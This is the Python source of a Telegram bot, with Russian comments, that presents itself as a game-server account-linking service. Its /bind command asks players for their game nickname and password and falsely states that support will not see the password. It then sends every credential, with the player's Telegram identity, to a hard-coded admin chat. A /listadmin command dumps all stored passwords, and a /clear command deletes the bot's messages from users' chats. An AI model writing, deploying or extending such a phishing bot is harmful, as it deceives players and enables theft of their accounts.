import asyncio
import os
import re
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

import aiohttp
from aiogram import Bot, Dispatcher, types, BaseMiddleware
from aiogram.filters import Command

# ==========================================
# ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
# ==========================================
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is active")

    def log_message(self, format, *args):
        return

def run_health_check_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_health_check_server, daemon=True).start()

# ==========================================
# ОСНОВНЫЕ НАСТРОЙКИ БОТА
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8070071877

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Базы данных (хранятся в оперативной памяти)
user_cooldowns = {}
banned_users = set()
accounts_db = {}  
bot_messages = {} # Сохраняет ID сообщений бота для их удаления

# ==========================================
# ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ
# ==========================================
async def send_tracked_message(chat_id: int, text: str):
    """Отправляет сообщение и запоминает его ID для команды /clear"""
    try:
        msg = await bot.send_message(chat_id, text)
        if chat_id not in bot_messages:
            bot_messages[chat_id] = []
        bot_messages[chat_id].append(msg.message_id)
        return msg
    except Exception:
        return None

# ==========================================
# ПРОВЕРКИ И MIDDLEWARE
# ==========================================
def is_valid_input(text: str) -> bool:
    return bool(re.match(r"^[A-Za-z0-9]+$", text))

class BanMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if event.from_user.id in banned_users:
            return
        return await handler(event, data)

dp.message.middleware(BanMiddleware())

# ==========================================
# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ
# ==========================================
@dp.message(Command("start"))
async def start_handler(message: types.Message):
    welcome_text = (
        "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие действия:\n"
        "1. Напишите: /bind [Ваш-Ник] [Ваш-Пароль]\n"
        "(Поддержка Ваш пароль не увидит)\n"
        "2. Напишите /help, чтобы увидеть возможности.\n"
        "Приятной игры на наших серверах."
    )
    await send_tracked_message(message.chat.id, welcome_text)

@dp.message(Command("help"))
async def help_handler(message: types.Message):
    help_text = (
        "Список доступных команд:\n\n"
        "/bind [Ник] [Пароль] - Привязать игровой аккаунт к Telegram.\n"
        "/list - Показать привязанные аккаунты.\n"
        "/ai [ваш вопрос] - Задать вопрос нейросети Phoenix AI.\n"
        "/help - Показать это меню."
    )
    await send_tracked_message(message.chat.id, help_text)

@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
    user_id = message.from_user.id
    current_time = time.time()

    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 15:
            remaining = int(15 - elapsed)
            for sec in range(remaining, 0, -1):
                try:
                    timer_msg = await bot.send_message(user_id, f"[Система] До следующей попытки {sec} секунд.")
                    await asyncio.sleep(1)
                    await timer_msg.delete()
                except Exception:
                    pass
            return

    args = message.text.split()
    if len(args) != 3:
        await send_tracked_message(user_id, "[Бот] Неверный формат. Используйте: /bind [Ник] [Пароль]")
        return

    username = args[1]
    password = args[2]

    if not is_valid_input(username) or not is_valid_input(password):
        await send_tracked_message(user_id, "[Бот] Неверный пароль или ник")
        return

    user_cooldowns[user_id] = current_time

    if user_id not in accounts_db:
        accounts_db[user_id] = []
    
    accounts_db[user_id].append({"nick": username, "password": password})
    await send_tracked_message(user_id, "[Бот] Аккаунт был успешно привязан.")

    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    admin_msg = (
        f"Новый привязанный аккаунт:\n\n"
        f"Игрок: {tg_user}\n"
        f"Telegram ID: {user_id}\n"
        f"Ник: {username}\n"
        f"Пароль: {password}"
    )

    try:
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    except Exception:
        pass

@dp.message(Command("list"))
async def list_handler(message: types.Message):
    user_id = message.from_user.id
    if user_id not in accounts_db or not accounts_db[user_id]:
        await send_tracked_message(user_id, "[Бот] У вас нет привязанных аккаунтов.")
        return

    text = "[Бот] Ваши привязанные аккаунты:\n\n"
    for acc in accounts_db[user_id]:
        text += f"Ник: {acc['nick']} | Пароль: {acc['password']}\n"
    await send_tracked_message(user_id, text)

@dp.message(Command("ai"))
async def ai_handler(message: types.Message):
    question = message.text[3:].strip()

    if not question:
        await send_tracked_message(message.chat.id, "[Phoenix AI] Напишите вопрос после команды. Пример: /ai Как играть?")
        return

    thinking_msg = await send_tracked_message(message.chat.id, "[Phoenix AI] Обработка запроса...")
    
    # Использование бесплатного API без ключей
    encoded_question = urllib.parse.quote(question)
    url = f"https://text.pollinations.ai/{encoded_question}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=20) as resp:
                if resp.status == 200:
                    ai_answer = await resp.text()
                    reply = f"[Phoenix AI]\n\n{ai_answer}"
                else:
                    reply = "[Phoenix AI] Ошибка сервера ИИ. Попробуйте позже."
        
        try:
            if thinking_msg:
                await bot.delete_message(message.chat.id, thinking_msg.message_id)
        except Exception:
            pass
            
        await send_tracked_message(message.chat.id, reply)
        
    except Exception:
        try:
            if thinking_msg:
                await bot.delete_message(message.chat.id, thinking_msg.message_id)
        except Exception:
            pass
        await send_tracked_message(message.chat.id, "[Phoenix AI] Произошла ошибка сети.")

# ==========================================
# АДМИН-КОМАНДЫ (ТОЛЬКО ДЛЯ АДМИНА)
# ==========================================
@dp.message(Command("msg"))
async def msg_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await bot.send_message(ADMIN_ID, "[Система] Неверный формат. Используйте: /msg [ID] [Текст]")
        return
    
    target_id = int(args[1])
    text = args[2]
    try:
        await send_tracked_message(target_id, f"[Ответ от администрации]\n{text}")
        await bot.send_message(ADMIN_ID, "[Система] Сообщение успешно отправлено.")
    except Exception:
        await bot.send_message(ADMIN_ID, "[Система] Ошибка отправки. Пользователь заблокировал бота или ID неверен.")

@dp.message(Command("ban"))
async def ban_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.send_message(ADMIN_ID, "[Система] Укажите ID. Пример: /ban 123456789")
        return
    
    target_id = int(args[1])
    banned_users.add(target_id)
    await bot.send_message(ADMIN_ID, f"[Система] Пользователь {target_id} заблокирован.")

@dp.message(Command("listadmin"))
async def listadmin_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if not accounts_db:
        await bot.send_message(ADMIN_ID, "[Система] База данных аккаунтов пуста.")
        return
        
    text = "[Система] Все привязанные аккаунты:\n\n"
    for uid, accs in accounts_db.items():
        for acc in accs:
            text += f"ID: {uid} | Ник: {acc['nick']} | Пароль: {acc['password']}\n"
    
    await bot.send_message(ADMIN_ID, text)

@dp.message(Command("dellist"))
async def dellist_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.send_message(ADMIN_ID, "[Система] Укажите ник для удаления. Пример: /dellist Player1")
        return
        
    target_nick = args[1]
    found = False
    
    for uid, accs in accounts_db.items():
        for acc in accs[:]:
            if acc['nick'] == target_nick:
                accs.remove(acc)
                found = True
                
    if found:
        await bot.send_message(ADMIN_ID, f"[Система] Аккаунт {target_nick} успешно удален из базы.")
    else:
        await bot.send_message(ADMIN_ID, "[Система] Аккаунт с таким ником не найден.")

@dp.message(Command("clear"))
async def clear_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.send_message(ADMIN_ID, "[Система] Укажите ID. Пример: /clear 123456789")
        return
        
    target_id = int(args[1])
    
    if target_id in bot_messages and bot_messages[target_id]:
        deleted_count = 0
        for msg_id in bot_messages[target_id]:
            try:
                await bot.delete_message(chat_id=target_id, message_id=msg_id)
                deleted_count += 1
            except Exception:
                pass
        
        bot_messages[target_id].clear()
        await bot.send_message(ADMIN_ID, f"[Система] Успешно удалено {deleted_count} сообщений бота у пользователя {target_id}.")
    else:
        await bot.send_message(ADMIN_ID, f"[Система] Нет сохраненных сообщений бота для удаления у пользователя {target_id}.")

# ==========================================
# ЗАПУСК БОТА
# ==========================================
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())


